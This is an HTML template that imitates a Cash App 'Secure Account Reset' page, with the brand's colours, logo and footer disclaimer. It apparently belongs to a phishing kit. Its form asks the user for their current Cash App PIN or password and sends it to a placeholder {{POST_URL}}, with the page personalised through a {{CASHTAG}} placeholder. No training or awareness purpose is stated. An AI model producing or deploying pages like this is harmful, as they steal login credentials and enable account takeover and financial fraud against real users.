<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cash App - Secure Account Reset</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #00D632; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; width: 400px; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 50px; margin-bottom: 20px; }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }
        .field { text-align: left; margin-bottom: 20px; }
        label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; font-weight: bold; text-transform: uppercase; }
        input { width: 100%; border: none; border-bottom: 2px solid #eee; padding: 10px 0; font-size: 18px; outline: none; transition: border-color 0.3s; }
        input:focus { border-color: #00D632; }
        .btn { background-color: #00D632; color: white; width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn:hover { background-color: #00b32a; }
        .footer { margin-top: 30px; font-size: 11px; color: #aaa; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg"><path d="M22 0C9.85 0 0 9.85 0 22s9.85 22 22 22 22-9.85 22-22S34.15 0 22 0zm10.74 29.58c-1.67 3.51-5.18 5.61-9.08 5.61-4.22 0-7.85-2.52-9.28-6.15l-1.31.52c1.67 4.24 5.92 7.18 10.59 7.18 4.6 0 8.71-2.48 10.74-6.73l-1.66-.43zm-19.48-15.16c1.67-3.51 5.18-5.61 9.08-5.61 4.22 0 7.85 2.52 9.28 6.15l1.31-.52c-1.67-4.24-5.92-7.18-10.59-7.18-4.6 0-8.71 2.48-10.74 6.73l1.66.43z" fill="#00D632"/></svg>
        <h2>Account Security</h2>
        <p>Reset your Cash App password for <strong>{{CASHTAG}}</strong></p>
        <form action="{{POST_URL}}" method="POST">
            <div class="field">
                <label>Current PIN or Password</label>
                <input type="password" name="old_password" required autofocus>
            </div>
            <div class="field">
                <label>New PIN or Password</label>
                <input type="password" name="new_password" required>
            </div>
            <div class="field">
                <label>Confirm PIN or Password</label>
                <input type="password" name="confirm" required>
            </div>
            <button type="submit" class="btn">Continue</button>
        </form>
        <div class="footer">
            Cash App is a financial services platform, not a bank. Banking services provided by Cash App's bank partner(s).
        </div>
    </div>
</body>
</html>
